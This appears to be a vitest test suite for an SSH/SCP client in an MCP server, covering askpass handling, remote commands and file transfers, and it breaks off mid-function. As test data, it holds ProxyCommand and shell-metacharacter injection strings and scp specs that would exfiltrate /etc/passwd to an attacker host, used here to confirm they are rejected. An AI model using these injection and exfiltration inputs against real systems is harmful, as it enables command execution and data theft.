import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import type { MockInstance } from 'vitest';
import { EventEmitter } from 'node:events';
import { join, relative, dirname } from 'node:path';
import { homedir, tmpdir } from 'node:os';
import { mkdtempSync, symlinkSync, rmSync } from 'node:fs';

// vitest scopes module mocks to the declaring file, so each test file installs
// its own. test-helpers.ts then sees the mocked copies.
vi.mock('node:fs', async () => {
  const actual = await vi.importActual<typeof import('node:fs')>('node:fs');
  return { ...actual, existsSync: vi.fn(actual.existsSync) };
});

vi.mock('node:fs/promises', async () => {
  const actual = await vi.importActual('node:fs/promises');
  return {
    ...actual,
    readFile: vi.fn(),
    stat: vi.fn(),
    writeFile: vi.fn(),
    chmod: vi.fn(),
    unlink: vi.fn(),
  };
});

import { SSHClient, SSH_BIN, SCP_BIN } from './server.js';
import {
  readFile,
  stat,
  writeFile,
  chmod,
  loadServerAs,
  createMockSpawn,
  createMockExecFileAsync,
  SAMPLE_SSH_CONFIG,
  SAMPLE_SSH_CONFIG_WITH_INCLUDE,
  SAMPLE_KNOWN_HOSTS,
} from './test-helpers.js';
import type { MockChild, MockedFs, TestClient } from './test-helpers.js';


// =============================================================================
// SSHClient Tests
// =============================================================================

describe('SSHClient', () => {
  let client: TestClient;

  beforeEach(() => {
    client = new SSHClient() as unknown as TestClient;
    vi.clearAllMocks();
  });

  describe('getPasswordForHost', () => {
    beforeEach(() => {
      readFile.mockResolvedValue(SAMPLE_SSH_CONFIG);
    });

    it('should find password by alias', async () => {
      const pw = await client.getPasswordForHost('mail');
      expect(pw).toBe('killer99');
    });

    it('should return null for host without password', async () => {
      const pw = await client.getPasswordForHost('prod');
      expect(pw).toBeNull();
    });

    it('should return null for unknown host', async () => {
      const pw = await client.getPasswordForHost('unknown');
      expect(pw).toBeNull();
    });

    it('should strip user@ prefix', async () => {
      const pw = await client.getPasswordForHost('saf@mail');
      expect(pw).toBe('killer99');
    });

    it('should find password by hostname', async () => {
      const pw = await client.getPasswordForHost('88.198.170.88');
      expect(pw).toBe('killer99');
    });
  });

  // The askpass helper is a /bin/sh script chmod'ed to 700 on POSIX and a .cmd
  // batch file on Windows (no chmod — NTFS ACLs, not mode bits). Both variants
  // are asserted explicitly so the suite is meaningful on either host OS.
  describe('getAskpassScript (POSIX)', () => {
    let posixClient: TestClient;
    let posixFs: MockedFs;

    beforeEach(async () => {
      const posix = await loadServerAs('linux');
      posixClient = new posix.SSHClient() as unknown as TestClient;
      posixFs = posix.fs;
      posixFs.writeFile.mockResolvedValue(undefined);
      posixFs.chmod.mockResolvedValue(undefined);
    });

    it('should create askpass script and cache it', async () => {
      const path1 = await posixClient.getAskpassScript();
      const path2 = await posixClient.getAskpassScript();

      expect(path1).toBe(path2);
      expect(posixFs.writeFile).toHaveBeenCalledTimes(1);
      expect(posixFs.chmod).toHaveBeenCalledWith(path1, 0o700);
    });

    it('should write correct script content', async () => {
      await posixClient.getAskpassScript();

      expect(posixFs.writeFile).toHaveBeenCalledWith(
        expect.stringContaining('mcp-ssh-askpass'),
        '#!/bin/sh\necho "$MCP_SSH_PASS"\n',
        expect.objectContaining({ flag: 'wx' })
      );
    });

    it('should use a .sh extension', async () => {
      const scriptPath = await posixClient.getAskpassScript();
      expect(scriptPath).toMatch(/mcp-ssh-askpass-\d+\.sh$/);
    });
  });

  describe('getAskpassScript (Windows)', () => {
    let winClient: TestClient;
    let winFs: MockedFs;

    beforeEach(async () => {
      const win = await loadServerAs('win32');
      winClient = new win.SSHClient() as unknown as TestClient;
      winFs = win.fs;
      winFs.writeFile.mockResolvedValue(undefined);
      winFs.chmod.mockResolvedValue(undefined);
    });

    it('should write a .cmd batch file with CRLF line endings', async () => {
      const scriptPath = await winClient.getAskpassScript();

      expect(scriptPath).toMatch(/mcp-ssh-askpass-\d+\.cmd$/);
      expect(winFs.writeFile).toHaveBeenCalledWith(
        scriptPath,
        '@echo off\r\necho %MCP_SSH_PASS%\r\n',
        expect.objectContaining({ flag: 'wx' })
      );
    });

    it('should not chmod the script', async () => {
      await winClient.getAskpassScript();
      expect(winFs.chmod).not.toHaveBeenCalled();
    });

    it('should cache the script path', async () => {
      const path1 = await winClient.getAskpassScript();
      const path2 = await winClient.getAskpassScript();

      expect(path1).toBe(path2);
      expect(winFs.writeFile).toHaveBeenCalledTimes(1);
    });
  });

  describe('buildSpawnEnv', () => {
    it('should return null for host without password', async () => {
      readFile.mockResolvedValue(SAMPLE_SSH_CONFIG);
      const env = await client.buildSpawnEnv('prod');
      expect(env).toBeNull();
    });

    it('should return env with SSH_ASKPASS for host with password', async () => {
      readFile.mockResolvedValue(SAMPLE_SSH_CONFIG);
      stat.mockResolvedValue({ mode: 0o100600 });
      writeFile.mockResolvedValue(undefined);
      chmod.mockResolvedValue(undefined);

      const env = await client.buildSpawnEnv('mail');
      expect(env.MCP_SSH_PASS).toBe('killer99');
      expect(env.SSH_ASKPASS).toContain('mcp-ssh-askpass');
      expect(env.SSH_ASKPASS_REQUIRE).toBe('force');
      expect(env.DISPLAY).toBe(process.env.DISPLAY);
    });

    // POSIX-pinned: relies on the permission check, which is a no-op on Windows.
    it('should throw if config has insecure permissions', async () => {
      const posix = await loadServerAs('linux');
      const posixClient = new posix.SSHClient() as unknown as TestClient;
      posix.fs.readFile.mockResolvedValue(SAMPLE_SSH_CONFIG);
      posix.fs.stat.mockResolvedValue({ mode: 0o100644 });

      // Trigger password parsing first
      await posixClient.getPasswordForHost('mail');

      await expect(posixClient.buildSpawnEnv('mail')).rejects.toThrow('insecure permissions');
    });
  });

  describe('runRemoteCommand', () => {
    beforeEach(() => {
      readFile.mockResolvedValue(`Host test\n    HostName 1.2.3.4\n`);
    });

    it('should execute ssh command and return output', async () => {
      client._spawn = createMockSpawn({ stdout: 'hello\n', code: 0 });

      const result = await client.runRemoteCommand('test', 'echo hello');

      expect(client._spawn).toHaveBeenCalledWith(
        SSH_BIN,
        ['-o', 'StrictHostKeyChecking=accept-new', '--', 'test', 'echo hello'],
        expect.any(Object)
      );
      expect(result).toEqual({ stdout: 'hello\n', stderr: '', code: 0 });
    });

    it('should handle command failure with exit code', async () => {
      client._spawn = createMockSpawn({ stderr: 'not found', code: 127 });

      const result = await client.runRemoteCommand('test', 'badcmd');
      expect(result.code).toBe(127);
      expect(result.stderr).toBe('not found');
    });

    it('should handle spawn error', async () => {
      client._spawn = createMockSpawn({ error: new Error('spawn failed') });

      const result = await client.runRemoteCommand('test', 'cmd');
      expect(result.code).toBe(1);
      expect(result.stderr).toBe('spawn failed');
    });

    it('should handle timeout', async () => {
      client._spawn = vi.fn(() => {
        const child = new EventEmitter() as MockChild;
        child.stdout = new EventEmitter();
        child.stderr = new EventEmitter();
        child.kill = vi.fn(() => {
          setTimeout(() => child.emit('close', null), 2);
        });
        return child;
      });

      const result = await client.runRemoteCommand('test', 'sleep 999', { timeout: 10 });
      expect(result.code).toBe(124);
      expect(result.stderr).toContain('Command timed out');
    });

    // `detached` is POSIX-only: it exists so ssh talks to SSH_ASKPASS instead of
    // grabbing a tty, a problem Windows does not have. Pin the platform on both
    // sides so neither expectation depends on the host OS.
    it('should set detached and env when password is available (POSIX)', async () => {
      const posix = await loadServerAs('linux');
      const posixClient = new posix.SSHClient() as unknown as TestClient;
      posix.fs.readFile.mockResolvedValue(SAMPLE_SSH_CONFIG);
      posix.fs.stat.mockResolvedValue({ mode: 0o100600 });
      posix.fs.writeFile.mockResolvedValue(undefined);
      posix.fs.chmod.mockResolvedValue(undefined);
      posixClient._spawn = createMockSpawn({ stdout: 'ok', code: 0 });

      await posixClient.runRemoteCommand('mail', 'ls');

      expect(posixClient._spawn).toHaveBeenCalledWith(
        posix.SSH_BIN,
        expect.any(Array),
        expect.objectContaining({
          detached: true,
          env: expect.objectContaining({
            MCP_SSH_PASS: 'killer99',
            SSH_ASKPASS_REQUIRE: 'force',
          }),
        })
      );
    });

    it('should set env but not detached when password is available (Windows)', async () => {
      const win = await loadServerAs('win32');
      const winClient = new win.SSHClient() as unknown as TestClient;
      win.fs.readFile.mockResolvedValue(SAMPLE_SSH_CONFIG);
      win.fs.writeFile.mockResolvedValue(undefined);
      winClient._spawn = createMockSpawn({ stdout: 'ok', code: 0 });

      await winClient.runRemoteCommand('mail', 'ls');

      const opts = winClient._spawn.mock.calls[0][2];
      expect(opts.env).toEqual(expect.objectContaining({ MCP_SSH_PASS: 'killer99' }));
      expect(opts.detached).toBeUndefined();
    });

    it('should not set detached without password', async () => {
      client._spawn = createMockSpawn({ stdout: 'ok', code: 0 });

      await client.runRemoteCommand('test', 'ls');

      expect(client._spawn).toHaveBeenCalledWith(
        SSH_BIN,
        expect.any(Array),
        expect.objectContaining({
          stdio: ['ignore', 'pipe', 'pipe'],
        })
      );
      const opts = client._spawn.mock.calls[0][2];
      expect(opts.detached).toBeUndefined();
      expect(opts.env).toBeUndefined();
    });

    it('should truncate stdout exceeding 10MB', async () => {
      client._spawn = vi.fn(() => {
        const child = new EventEmitter() as MockChild;
        child.stdout = new EventEmitter();
        child.stderr = new EventEmitter();
        child.kill = vi.fn();

        setTimeout(() => {
          // Send in two chunks so the second one triggers truncation
          child.stdout.emit('data', Buffer.from('x'.repeat(10 * 1024 * 1024)));
          child.stdout.emit('data', Buffer.from('x'.repeat(1024)));
          child.emit('close', 0);
        }, 5);

        return child;
      });

      const result = await client.runRemoteCommand('test', 'bigcmd');
      expect(result.stdout).toContain('[Output truncated');
    });

    it('should reject hostAlias starting with - to block ProxyCommand injection', async () => {
      client._spawn = createMockSpawn({ stdout: 'pwned', code: 0 });

      await expect(
        client.runRemoteCommand('-oProxyCommand=touch /tmp/pwned', 'echo')
      ).rejects.toThrow(/Invalid hostAlias/);
      expect(client._spawn).not.toHaveBeenCalled();
    });

    it('should reject hostAlias containing shell metacharacters (Windows cmd.exe vector)', async () => {
      client._spawn = createMockSpawn({ stdout: '', code: 0 });

      for (const evil of ['foo & calc.exe', 'foo|calc', 'foo;ls', 'foo`id`', 'foo$(id)', 'foo"bar', "foo'bar"]) {
        await expect(client.runRemoteCommand(evil, 'ls')).rejects.toThrow(/Invalid hostAlias/);
      }
      expect(client._spawn).not.toHaveBeenCalled();
    });

    it('should reject unknown hostAlias that is not in ssh config or known_hosts', async () => {
      readFile
        .mockResolvedValueOnce(`Host test\n    HostName 1.2.3.4\n`)
        .mockResolvedValueOnce('');
      client._spawn = createMockSpawn({ stdout: '', code: 0 });

      await expect(client.runRemoteCommand('unknown.example.com', 'ls')).rejects.toThrow(/Unknown hostAlias/);
      expect(client._spawn).not.toHaveBeenCalled();
    });

    it('should allow user@alias when alias exists in ssh config', async () => {
      client._spawn = createMockSpawn({ stdout: 'ok\n', code: 0 });

      const result = await client.runRemoteCommand('root@test', 'whoami');

      expect(client._spawn).toHaveBeenCalledWith(
        SSH_BIN,
        ['-o', 'StrictHostKeyChecking=accept-new', '--', 'root@test', 'whoami'],
        expect.any(Object)
      );
      expect(result.code).toBe(0);
    });

    it('should allow hosts discovered through Include directives', async () => {
      readFile.mockImplementation(async (filePath) => {
        // Separator-agnostic: configPath is ~/.ssh/config on POSIX but
        // C:\Users\…\.ssh\config on Windows, where endsWith('/config') misses.
        if (/[\\/]config$/.test(String(filePath))) return SAMPLE_SSH_CONFIG_WITH_INCLUDE;
        if (String(filePath).endsWith('.conf')) return `Host included\n    HostName 10.10.10.10\n`;
        if (String(filePath).endsWith('known_hosts')) return '';
        return '';
      });
      client.configParser.expandIncludePath = vi.fn(() => ['/tmp/included.conf']);
      client._spawn = createMockSpawn({ stdout: 'ok\n', code: 0 });

      const result = await client.runRemoteCommand('included', 'hostname');

      expect(client._spawn).toHaveBeenCalled();
      expect(result.code).toBe(0);
    });

    it('should truncate stderr exceeding 10MB', async () => {
      client._spawn = vi.fn(() => {
        const child = new EventEmitter() as MockChild;
        child.stdout = new EventEmitter();
        child.stderr = new EventEmitter();
        child.kill = vi.fn();

        setTimeout(() => {
          child.stderr.emit('data', Buffer.from('x'.repeat(10 * 1024 * 1024)));
          child.stderr.emit('data', Buffer.from('x'.repeat(1024)));
          child.emit('close', 0);
        }, 5);

        return child;
      });

      const result = await client.runRemoteCommand('test', 'bigcmd');
      expect(result.stderr).toContain('[Stderr truncated');
    });
  });

  describe('getHostInfo', () => {
    beforeEach(() => {
      readFile.mockResolvedValue(SAMPLE_SSH_CONFIG);
    });

    it('should return host info without password exposed', async () => {
      const info = await client.getHostInfo('mail');
      expect(info.alias).toBe('mail');
      expect(info.hostname).toBe('88.198.170.88');
      expect(info._password).toBeUndefined();
      expect(info.passwordAuth).toBe(true);
    });

    it('should not set passwordAuth flag when no password', async () => {
      const info = await client.getHostInfo('prod');
      expect(info.passwordAuth).toBeUndefined();
    });

    it('should return null for unknown host', async () => {
      const info = await client.getHostInfo('nonexistent');
      expect(info).toBeNull();
    });

    it('should return correct port and user', async () => {
      const info = await client.getHostInfo('prod');
      expect(info.port).toBe(42077);
      expect(info.user).toBe('trashmail');
    });
  });

  describe('checkConnectivity', () => {
    beforeEach(() => {
      readFile.mockResolvedValue(`Host test\n    HostName 1.2.3.4\n`);
    });

    it('should return connected on success', async () => {
      client._spawn = createMockSpawn({ stdout: 'connected\n', code: 0 });

      const status = await client.checkConnectivity('test');
      expect(status).toEqual({ connected: true, message: 'Connection successful' });
    });

    it('should return not connected on failure', async () => {
      client._spawn = createMockSpawn({ stderr: 'refused', code: 255 });

      const status = await client.checkConnectivity('test');
      expect(status).toEqual({ connected: false, message: 'Connection failed' });
    });

    it('should return not connected when output is unexpected', async () => {
      client._spawn = createMockSpawn({ stdout: 'something else', code: 0 });

      const status = await client.checkConnectivity('test');
      expect(status.connected).toBe(false);
    });
  });

  describe('uploadFile', () => {
    beforeEach(() => {
      readFile.mockResolvedValue(`Host test\n    HostName 1.2.3.4\n`);
    });

    it('should return true on success', async () => {
      client._execFileAsync = createMockExecFileAsync();

      const result = await client.uploadFile('test', '/local/file', '/remote/file');
      expect(result).toBe(true);
      expect(client._execFileAsync).toHaveBeenCalledWith(
        SCP_BIN,
        ['-o', 'StrictHostKeyChecking=accept-new', '--', '/local/file', '[test]:/remote/file'],
        expect.any(Object)
      );
    });

    it('should return false on error', async () => {
      client._execFileAsync = createMockExecFileAsync({ error: new Error('scp failed') });

      const result = await client.uploadFile('test', '/local/file', '/remote/file');
      expect(result).toBe(false);
    });

    it('should pass password env when available', async () => {
      readFile.mockResolvedValue(SAMPLE_SSH_CONFIG);
      stat.mockResolvedValue({ mode: 0o100600 });
      writeFile.mockResolvedValue(undefined);
      chmod.mockResolvedValue(undefined);
      client._execFileAsync = createMockExecFileAsync();

      await client.uploadFile('mail', '/local/file', '/remote/file');

      const opts = client._execFileAsync.mock.calls[0][2];
      expect(opts.env.MCP_SSH_PASS).toBe('killer99');
    });

    it('should reject hostAlias starting with - to block ProxyCommand injection', async () => {
      client._execFileAsync = createMockExecFileAsync();

      const result = await client.uploadFile('-oProxyCommand=touch /tmp/pwned', '/local/file', '/remote/file');
      expect(result).toBe(false);
      expect(client._execFileAsync).not.toHaveBeenCalled();
    });

    it('should reject unknown hostAlias for uploads', async () => {
      readFile
        .mockResolvedValueOnce(`Host test\n    HostName 1.2.3.4\n`)
        .mockResolvedValueOnce('');
      client._execFileAsync = createMockExecFileAsync();

      const result = await client.uploadFile('unknown.example.com', '/local/file', '/remote/file');
      expect(result).toBe(false);
      expect(client._execFileAsync).not.toHaveBeenCalled();
    });
  });

  describe('downloadFile', () => {
    beforeEach(() => {
      readFile.mockResolvedValue(`Host test\n    HostName 1.2.3.4\n`);
    });

    it('should return true on success', async () => {
      client._execFileAsync = createMockExecFileAsync();

      const result = await client.downloadFile('test', '/remote/file', '/local/file');
      expect(result).toBe(true);
      expect(client._execFileAsync).toHaveBeenCalledWith(
        SCP_BIN,
        ['-o', 'StrictHostKeyChecking=accept-new', '--', '[test]:/remote/file', '/local/file'],
        expect.any(Object)
      );
    });

    it('should return false on error', async () => {
      client._execFileAsync = createMockExecFileAsync({ error: new Error('scp failed') });

      const result = await client.downloadFile('test', '/remote/file', '/local/file');
      expect(result).toBe(false);
    });

    it('should reject hostAlias starting with - to block ProxyCommand injection', async () => {
      client._execFileAsync = createMockExecFileAsync();

      const result = await client.downloadFile('-oProxyCommand=touch /tmp/pwned', '/remote/file', '/local/file');
      expect(result).toBe(false);
      expect(client._execFileAsync).not.toHaveBeenCalled();
    });

    it('should allow hostnames learned from known_hosts for downloads', async () => {
      readFile
        .mockResolvedValueOnce(`Host test\n    HostName 1.2.3.4\n`)
        .mockResolvedValueOnce('10.0.0.1 ssh-rsa AAAAB3Nz...\n');
      client._execFileAsync = createMockExecFileAsync();

      const result = await client.downloadFile('10.0.0.1', '/remote/file', '/local/file');
      expect(result).toBe(true);
      expect(client._execFileAsync).toHaveBeenCalled();
    });
  });

  describe('runCommandBatch', () => {
    beforeEach(() => {
      readFile.mockResolvedValue(`Host test\n    HostName 1.2.3.4\n`);
    });

    it('should execute multiple commands and return results', async () => {
      let callCount = 0;
      client._spawn = vi.fn(() => {
        callCount++;
        const child = new EventEmitter() as MockChild;
        child.stdout = new EventEmitter();
        child.stderr = new EventEmitter();
        child.kill = vi.fn();
        const n = callCount;
        setTimeout(() => {
          child.stdout.emit('data', Buffer.from(`output${n}\n`));
          child.emit('close', 0);
        }, 5);
        return child;
      });

      const result = await client.runCommandBatch('test', ['cmd1', 'cmd2']);
      expect(result.success).toBe(true);
      expect(result.results).toHaveLength(2);
      expect(result.results[0].stdout).toBe('output1\n');
      expect(result.results[1].stdout).toBe('output2\n');
    });

    it('should mark as failed if any command fails but continue', async () => {
      let callCount = 0;
      client._spawn = vi.fn(() => {
        callCount++;
        const child = new EventEmitter() as MockChild;
        child.stdout = new EventEmitter();
        child.stderr = new EventEmitter();
        child.kill = vi.fn();
        const exitCode = callCount === 1 ? 1 : 0;
        setTimeout(() => {
          child.emit('close', exitCode);
        }, 5);
        return child;
      });

      const result = await client.runCommandBatch('test', ['fail', 'pass']);
      expect(result.success).toBe(false);
      expect(result.results).toHaveLength(2);
    });

    it('should handle empty command list', async () => {
      const result = await client.runCommandBatch('test', []);
      expect(result.success).toBe(true);
      expect(result.results).toHaveLength(0);
    });
  });

  describe('listKnownHosts', () => {
    it('should delegate to configParser.getAllKnownHosts', async () => {
      readFile
        .mockResolvedValueOnce(SAMPLE_SSH_CONFIG)
        .mockResolvedValueOnce(SAMPLE_KNOWN_HOSTS);
      stat.mockResolvedValue({ mode: 0o100600 });

      const hosts = await client.listKnownHosts();
      expect(hosts.length).toBeGreaterThan(0);
    });
  });

  describe('checkConnectivity error handling', () => {
    it('should handle thrown errors gracefully', async () => {
      readFile.mockRejectedValue(new Error('config read failed'));
      client._spawn = createMockSpawn({ stderr: 'error', code: 1 });

      const status = await client.checkConnectivity('test');
      expect(status.connected).toBe(false);
    });

    it('should catch exceptions from runRemoteCommand', async () => {
      client.runRemoteCommand = vi.fn().mockRejectedValue(new Error('ssh crash'));

      const status = await client.checkConnectivity('test');
      expect(status.connected).toBe(false);
      expect(status.message).toBe('ssh crash');
    });

    it('should handle non-Error thrown values in catch', async () => {
      client.runRemoteCommand = vi.fn().mockRejectedValue('string error');

      const status = await client.checkConnectivity('test');
      expect(status.connected).toBe(false);
      expect(status.message).toBe('string error');
    });
  });

  describe('runCommandBatch error handling', () => {
    it('should handle thrown errors gracefully', async () => {
      // Make runRemoteCommand throw by overriding it
      client.runRemoteCommand = vi.fn().mockRejectedValue(new Error('connection lost'));

      const result = await client.runCommandBatch('test', ['cmd1']);
      expect(result.success).toBe(false);
      expect(result.results[0].stderr).toBe('connection lost');
      expect(result.results[0].code).toBe(1);
    });

    it('should handle non-Error thrown values', async () => {
      client.runRemoteCommand = vi.fn().mockRejectedValue('string error');

      const result = await client.runCommandBatch('test', ['cmd1']);
      expect(result.success).toBe(false);
      expect(result.results[0].stderr).toBe('string error');
    });
  });
});

// =============================================================================
// MCP Server Handler Tests (via main())
// =============================================================================


// =============================================================================
// Remaining branches: argument validation, known_hosts matching, silent mode,
// askpass cleanup handlers and the tool-dispatch catch-all.
// =============================================================================

describe('_assertSafeHostAlias argument validation', () => {
  let client: TestClient;

  beforeEach(() => {
    client = new SSHClient() as unknown as TestClient;
    vi.clearAllMocks();
  });

  it.each([
    ['undefined', undefined],
    ['null', null],
    ['a number', 42],
    ['an empty string', ''],
    ['an array', ['test']],
  ])('should reject %s before touching ssh', async (_label, value) => {
    expect(() => client._assertSafeHostAlias(value)).toThrow('must be a non-empty string');
  });

  it('should surface the type error through runRemoteCommand', async () => {
    client._spawn = createMockSpawn({ stdout: 'ok', code: 0 });

    await expect(client.runRemoteCommand(null, 'echo hi')).rejects.toThrow(
      'must be a non-empty string'
    );
    expect(client._spawn).not.toHaveBeenCalled();
  });
});


describe('hostMatchesAlias against known_hosts entries', () => {
  let client: TestClient;

  beforeEach(() => {
    client = new SSHClient() as unknown as TestClient;
    vi.clearAllMocks();
  });

  it('should keep scanning past a non-matching known_hosts entry', async () => {
    // known_hosts entries carry only a hostname (no alias/aliases), so matching
    // them falls through to the plain-alias comparison. The host we ask for is
    // the *second* entry, so the first one has to be rejected and skipped.
    readFile.mockImplementation(async (filePath) => {
      if (/known_hosts$/.test(String(filePath))) {
        return '10.0.0.1 ssh-ed25519 AAAA...\n10.0.0.2 ssh-ed25519 BBBB...\n';
      }
      return `Host other\n    HostName 192.168.1.1\n`;
    });
    client._spawn = createMockSpawn({ stdout: 'ok\n', code: 0 });

    const result = await client.runRemoteCommand('10.0.0.2', 'uptime');
    expect(result.code).toBe(0);
  });
});


describe('askpass script cleanup handlers', () => {
  let client: TestClient;
  let exitSpy: MockInstance;

  beforeEach(async () => {
    vi.clearAllMocks();
    writeFile.mockResolvedValue(undefined);
    chmod.mockResolvedValue(undefined);
    client = new SSHClient() as unknown as TestClient;
    exitSpy = vi.spyOn(process, 'exit').mockImplementation((() => undefined) as never);
  });

  afterEach(() => {
    exitSpy.mockRestore();
  });

  // The handlers registered by getAskpassScript are invoked directly: they only
  // ever run while the process is tearing down, which a unit test cannot trigger.
  async function registerAndTake(signal) {
    const before = process.listeners(signal).length;
    await client.getAskpassScript();
    const listeners = process.listeners(signal);
    expect(listeners.length).toBeGreaterThan(before);
    const handler = listeners[listeners.length - 1] as (...args: any[]) => void;
    return () => {
      handler();
      process.removeListener(signal, handler);
    };
  }

  it('should unlink the script on exit', async () => {
    const run = await registerAndTake('exit');
    // unlinkSync throws ENOENT (writeFile is mocked, so no file exists) and the
    // handler must swallow it.
    expect(run).not.toThrow();
  });

  it('should clean up and exit 130 on SIGINT', async () => {
    const run = await registerAndTake('SIGINT');
    run();
    expect(exitSpy).toHaveBeenCalledWith(130);
  });

  it('should clean up and exit 143 on SIGTERM', async () => {
    const run = await registerAndTake('SIGTERM');
    run();
    expect(exitSpy).toHaveBeenCalledWith(143);
  });
});


describe('password env on the scp paths', () => {
  let client: TestClient;

  beforeEach(() => {
    client = new SSHClient() as unknown as TestClient;
    vi.clearAllMocks();
    readFile.mockResolvedValue(SAMPLE_SSH_CONFIG);
    stat.mockResolvedValue({ mode: 0o100600 });
    writeFile.mockResolvedValue(undefined);
    chmod.mockResolvedValue(undefined);
  });

  it('should pass password env to downloadFile', async () => {
    client._execFileAsync = createMockExecFileAsync();

    const result = await client.downloadFile('mail', '/remote/file', '/local/file');

    expect(result).toBe(true);
    expect(client._execFileAsync).toHaveBeenCalledWith(
      SCP_BIN,
      expect.any(Array),
      expect.objectContaining({
        env: expect.objectContaining({ MCP_SSH_PASS: 'killer99' }),
      })
    );
  });

  it('should skip the permission sweep when no config declared a password', async () => {
    // A password reached us without extractHostsFromConfig having flagged any
    // config file — there is then nothing to check the permissions of.
    client.getPasswordForHost = vi.fn().mockResolvedValue('secret');
    client.configParser._configsWithPasswords = undefined;

    const env = await client.buildSpawnEnv('anything');

    expect(env.MCP_SSH_PASS).toBe('secret');
    expect(stat).not.toHaveBeenCalled();
  });
});


describe('output truncation', () => {
  let client: TestClient;

  beforeEach(() => {
    client = new SSHClient() as unknown as TestClient;
    vi.clearAllMocks();
    readFile.mockResolvedValue(`Host test\n    HostName 1.2.3.4\n`);
  });

  // Three chunks: the second crosses the limit and appends the marker, the third
  // must be dropped silently rather than appending it again.
  function spawnEmitting(stream, chunks) {
    return vi.fn(() => {
      const child = new EventEmitter() as MockChild;
      child.stdout = new EventEmitter();
      child.stderr = new EventEmitter();
      child.kill = vi.fn();

      setTimeout(() => {
        for (const chunk of chunks) child[stream].emit('data', Buffer.from(chunk));
        child.emit('close', 0);
      }, 5);

      return child;
    });
  }

  it('should append the stdout truncation marker only once', async () => {
    client._spawn = spawnEmitting('stdout', [
      'x'.repeat(10 * 1024 * 1024),
      'y'.repeat(1024),
      'z'.repeat(1024),
    ]);

    const result = await client.runRemoteCommand('test', 'bigcmd');
    const markers = result.stdout.match(/\[Output truncated/g) || [];
    expect(markers).toHaveLength(1);
  });

  it('should append the stderr truncation marker only once', async () => {
    client._spawn = spawnEmitting('stderr', [
      'x'.repeat(10 * 1024 * 1024),
      'y'.repeat(1024),
      'z'.repeat(1024),
    ]);

    const result = await client.runRemoteCommand('test', 'bigcmd');
    const markers = result.stderr.match(/\[Stderr truncated/g) || [];
    expect(markers).toHaveLength(1);
  });
});

// =============================================================================
// Windows ProgramData normalization (issue #10)
//
// Claude Desktop launches the extension with a stripped, allow-listed
// environment that omits %ProgramData%. Win32-OpenSSH resolves it at startup to
// find its global config (%ProgramData%\ssh\) and exits 255 with no output when
// it is unset, so every spawned ssh/scp fails while the same command works from
// a normal shell. server.mjs restores the variable at import time; these tests
// pin that behaviour, including that it stays out of the way on POSIX.
// =============================================================================


describe('remote command exit codes', () => {
  let client: TestClient;

  beforeEach(() => {
    client = new SSHClient() as unknown as TestClient;
    vi.clearAllMocks();
    readFile.mockResolvedValue(`Host test\n    HostName 1.2.3.4\n`);
  });

  it('should report code 0 when the process closes with a null code', async () => {
    // ssh killed by a signal exits with a null code and no timeout involved.
    client._spawn = vi.fn(() => {
      const child = new EventEmitter() as MockChild;
      child.stdout = new EventEmitter();
      child.stderr = new EventEmitter();
      child.kill = vi.fn();
      setTimeout(() => child.emit('close', null), 5);
      return child;
    });

    const result = await client.runRemoteCommand('test', 'whatever');
    expect(result.code).toBe(0);
  });
});

describe('runRemoteCommand timeout defaulting', () => {
  let client: TestClient;

  beforeEach(() => {
    client = new SSHClient() as unknown as TestClient;
    vi.clearAllMocks();
    readFile.mockResolvedValue(`Host test\n    HostName 1.2.3.4\n`);
  });

  // Regression guard: `??` here would hand ssh a zero-millisecond timeout and
  // kill the command immediately. Zero means "not specified", as it does in the
  // tool dispatcher.
  it('should treat a zero timeout as absent rather than immediate', async () => {
    vi.useFakeTimers();
    try {
      client._spawn = createMockSpawn({ stdout: 'ok\n', code: 0 });
      const pending = client.runRemoteCommand('test', 'echo ok', { timeout: 0 });

      // Well past an immediate timeout, but far short of the 30s default.
      await vi.advanceTimersByTimeAsync(1000);
      const result = await pending;

      expect(result.code).toBe(0);
      expect(result.stderr).not.toContain('timed out');
    } finally {
      vi.useRealTimers();
    }
  });
});

// =============================================================================
// GHSA-gpr2-2wqr-7rgp — scp remote-spec allowlist bypass via localPath
//
// scp decides "remote or local" by looking for a colon that is not preceded by
// a path separator, so a localPath of `scp://attacker/…` or `host:/path` makes
// it open a *second* SSH connection and copy the file to a host that was never
// in the user's config. That bypasses _assertKnownHostAlias, the product's
// primary trust boundary. The `--` terminator does not help: it stops option
// parsing, not remote-spec interpretation.
// =============================================================================

describe('localPath must not be an scp remote spec', () => {
  let client: TestClient;

  beforeEach(() => {
    client = new SSHClient() as unknown as TestClient;
    vi.clearAllMocks();
    readFile.mockResolvedValue(`Host test\n    HostName 1.2.3.4\n`);
    client._execFileAsync = createMockExecFileAsync();
  });

  const remoteSpecs = [
    ['an scp:// URI', 'scp://attacker@evil.example:22//tmp/leaked.txt'],
    ['an sftp:// URI', 'sftp://attacker@evil.example//tmp/leaked.txt'],
    ['a bare host:path spec', 'evil.example:/tmp/leaked.txt'],
    ['a user@host:path spec', 'attacker@evil.example:/tmp/leaked.txt'],
    ['an IPv4 host spec', '203.0.113.10:/tmp/leaked.txt'],
  ];

  it.each(remoteSpecs)('should refuse downloadFile with %s', async (_label, localPath) => {
    const result = await client.downloadFile('test', '/etc/passwd', localPath);

    expect(result).toBe(false);
    // The exploit is only prevented if scp is never invoked at all.
    expect(client._execFileAsync).not.toHaveBeenCalled();
  });

  it.each(remoteSpecs)('should refuse uploadFile with %s', async (_label, localPath) => {
    const result = await client.uploadFile('test', localPath, '/tmp/dest');

    expect(result).toBe(false);
    expect(client._execFileAsync).not.toHaveBeenCalled();
  });

  it('should refuse an empty localPath', async () => {
    expect(await client.downloadFile('test', '/etc/passwd', '')).toBe(false);
    expect(client._execFileAsync).not.toHaveBeenCalled();
  });

  it.each([
    ['an absolute path', '/tmp/dest.txt'],
    ['a relative path', 'dest.txt'],
    ['a path containing a colon after a separator', '/tmp/weird:name.txt'],
    ['a relative path below a directory', './out/dest:1.txt'],
    ['a home-relative path', '~/dest.txt'],
  ])('should still allow %s', async (_label, localPath) => {
    const result = await client.downloadFile('test', '/etc/passwd', localPath);

    expect(result).toBe(true);
    expect(client._execFileAsync).toHaveBeenCalledWith(
      SCP_BIN,
      ['-o', 'StrictHostKeyChecking=accept-new', '--', '[test]:/etc/passwd', localPath],
      expect.any(Object)
    );
  });
});

describe('localPath validation across platforms', () => {
  // A Windows drive letter is a local path on Windows and scp treats it as one.
  // On POSIX the same string really is parsed as host "C" — verified against the
  // real scp, which reports 'Could not resolve hostname c'. So the rule has to
  // differ per platform, and both halves are pinned here rather than assumed.

  async function clientOn(platform: string) {
